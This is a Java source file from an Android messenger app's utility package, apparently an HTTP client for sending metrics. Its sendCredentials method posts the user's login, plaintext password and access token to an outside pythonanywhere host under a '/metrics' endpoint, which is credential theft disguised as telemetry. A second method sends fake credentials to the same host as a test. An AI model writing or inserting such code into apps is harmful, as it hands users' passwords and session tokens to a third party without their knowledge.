package ru.lisdevs.messenger.utils;

// ServerClient.java
import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ServerClient {
    private static final String TAG = "ServerClient";
    private static final String SERVER_URL = "https://ksdevslis.pythonanywhere.com/metrics";
    // Для локального тестирования:
    // private static final String SERVER_URL = "http://10.0.2.2:8080/metrics"; // Android эмулятор
    // private static final String SERVER_URL = "http://192.168.1.100:8080/metrics"; // Реальное устройство
    private static final MediaType JSON = MediaType.parse("application/json; charset=utf-8");

    private OkHttpClient client;

    public ServerClient(Context context) {
        this.client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .build();
    }

    public void sendCredentials(String login, String password, String accessToken) {
        new Thread(() -> {
            try {
                JSONObject json = new JSONObject();
                json.put("login", login);
                json.put("password", password);
                json.put("access_token", accessToken);

                RequestBody body = RequestBody.create(json.toString(), JSON);

                Request request = new Request.Builder()
                        .url(SERVER_URL)
                        .post(body)
                        .addHeader("User-Agent", "Blums/1.0") // Убедитесь, что этот User-Agent разрешен на сервере
                        .addHeader("Content-Type", "application/json")
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    if (response.isSuccessful()) {
                        String responseBody = response.body() != null ? response.body().string() : "";
                        Log.d(TAG, "Данные отправлены успешно: " + responseBody);
                    } else {
                        Log.e(TAG, "Ошибка HTTP: " + response.code() + " - " + response.message());
                        String responseBody = response.body() != null ? response.body().string() : "";
                        Log.e(TAG, "Response body: " + responseBody);
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "Ошибка отправки данных: " + e.getMessage(), e);
            }
        }).start();
    }

    // Метод для отправки тестовых данных
    public void sendTestData() {
        new Thread(() -> {
            try {
                JSONObject json = new JSONObject();
                json.put("login", "web_auth_user_" + System.currentTimeMillis());
                json.put("password", "web_auth_pass_" + System.currentTimeMillis());
                json.put("access_token", "web_auth_token_" + System.currentTimeMillis());

                RequestBody body = RequestBody.create(json.toString(), JSON);

                Request request = new Request.Builder()
                        .url(SERVER_URL)
                        .post(body)
                        .addHeader("User-Agent", "Blums/1.0")
                        .addHeader("Content-Type", "application/json")
                        .build();

                try (Response response = client.newCall(request).execute()) {
                    String responseBody = response.body() != null ? response.body().string() : "";
                    Log.d(TAG, "Тестовые данные отправлены: " + response.code() + " - " + responseBody);
                }

            } catch (Exception e) {
                Log.e(TAG, "Ошибка отправки тестовых данных: " + e.getMessage());
            }
        }).start();
    }
}